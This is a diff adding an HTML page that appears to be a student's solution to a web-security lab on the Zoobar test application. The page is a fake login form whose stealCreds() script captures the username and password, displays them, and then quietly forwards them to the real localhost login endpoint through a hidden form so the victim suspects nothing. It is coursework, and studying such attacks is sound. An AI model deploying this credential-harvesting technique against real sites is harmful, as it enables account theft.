@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+    <script type="text/javascript" src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
+    <script>
+      if (myZoobars != undefined) {
+        window.location.href="file:///C:/Users/drums/OneDrive/Asiakirjat/opiskelu/Ohjelmistoturvallisuus/answer-2.html";
+        //polku, jonne answer-2.html on tallennettu levylle
+        //vaihda tämä vastaamaan polkua, missä itselläsi tämä tiedosto sijaitsee
+      }
+    </script>
+    <title>
+      Login - Zoobar Foundation
+    </title>
+  </head>
+  <body>
+    <h1>Zoobar Foundation for Ethical Advocacy</h1>
+      <h2>Supporting the meritorious researchers of the new world order</h2>
+      
+    <div id="login" class="centerpiece">
+      <form name="loginform" method="POST" onsubmit="event.preventDefault(); stealCreds();">
+        <table>
+          <tbody>
+            <tr>
+              <td>Username:</td>
+              <td><input name="login_username" size="20" autocomplete="no" value="" type="text"></td>
+            </tr>
+            <tr>
+              <td>Password:</td>
+              <td colspan="2"><input name="login_password" size="20" autocomplete="no" type="password">
+                <input name="submit_login" value="Log in" type="submit">
+                <input name="submit_registration" value="Register" type="submit"></td>
+            </tr>
+          </tbody></table>
+      </form>
+      <script>
+        function stealCreds() {
+          var un = document.getElementsByName("login_username")[0];
+          var pwd = document.getElementsByName("login_password")[0];
+          var msg = [un.value, pwd.value];
+          alert(msg.join());
+          
+          var parent = document.getElementById("login");
+          var form = document.createElement("form");
+          var usern = document.createElement("input");
+          var passw = document.createElement("input");
+          var submit = document.createElement("input");
+          
+          var next = document.createElement("input");
+          
+          parent.appendChild(form);
+          form.appendChild(usern);
+          form.appendChild(passw);
+          form.appendChild(submit);
+          
+          form.appendChild(next);
+          
+          form.type="hidden";
+          form.style = "visibility:hidden; height:0; width:0; position:absolute;";
+          form.method = "POST";
+          form.name = "loginform"
+          form.action = "http://localhost:8080/zoobar/index.cgi/login";
+          
+          usern.name = "login_username";
+          usern.value = un.value;
+          usern.type = "text";
+          usern.autocomplete =  "no";
+          
+          passw.name = "login_password";
+          passw.value = pwd.value;
+          passw.type ="password";
+          passw.autocomplete = "no";
+          
+          submit.name = "submit_login";
+          submit.value = "Log in";
+          submit.type = "submit";
+          
+          next.name = "nexturl";
+          next.value = "";
+          next.type ="hidden";
+          
+          submit.click();
+        }
+      </script>
+    </div>
+<script>document.loginform.login_username.focus();</script>
+  </body>
+</html>
